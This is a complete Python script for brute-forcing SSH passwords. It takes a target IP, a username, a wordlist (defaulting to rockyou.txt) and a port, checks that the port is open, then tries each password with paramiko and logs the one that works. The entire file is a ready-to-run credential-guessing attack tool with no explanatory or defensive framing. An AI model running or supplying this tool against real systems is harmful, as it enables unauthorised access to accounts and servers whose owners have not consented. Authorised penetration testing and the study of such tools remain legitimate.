#!/usr/local/bin/python
import paramiko
import socket
import logging

TARGET = input('Please enter target IP address: ')
USERNAME = input('Please enter username to bruteforce: ')

USE_ROCKYOU = input('Do you want to use rockyou.txt for the password file? (y/n)').lower() == 'y'
PASSWORD_FILE = '/usr/share/wordlists/rockyou.txt' if USE_ROCKYOU else input('Please enter location of the password file: ')
SSH_PORT = int(input('Please enter the SSH port to use: '))

# Constants
SOCKET_TIMEOUT = 5

logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.INFO)

def check_ssh_port(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(SOCKET_TIMEOUT)
            result = sock.connect_ex((host, port))
            if result == 0:
                logging.info(f"Port {port} is open on {host}")
                return True
            else:
                logging.info(f"Port {port} is closed on {host}")
                return False
    except Exception as e:
        logging.error("Error: %s", e)
        return False

def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(TARGET, port=SSH_PORT, username=USERNAME, password=password)
    except paramiko.AuthenticationException:
        return False
    finally:
        ssh.close()

    return True

def main():
    if not check_ssh_port(TARGET, SSH_PORT):
        logging.error(f"Port {SSH_PORT} is closed on {TARGET}")
        exit(1)

    try:
        with open(PASSWORD_FILE, 'rb') as file:
            passwords = file.readlines()
            total_passwords = len(passwords)

            logging.info("Please wait, trying to brute force...")

            for i, password in enumerate(passwords):
                password = password.strip()

                try:
                    if ssh_connect(password):
                        logging.info('Password found: %s', password.decode("utf-8"))
                        break
                    else:
                        logging.info('No luck with %s', password.decode("utf-8"))
                except Exception as e:
                    logging.error(e)
                    pass

                percentage = (i + 1) / total_passwords * 100
                logging.info("\033[32mProgress: %.2f%%\033[0m", percentage)

    except KeyboardInterrupt:
        logging.info("\nBrute force process interrupted by user.")
    finally:
        logging.info("Brute force complete.")

if __name__ == "__main__":
    main()
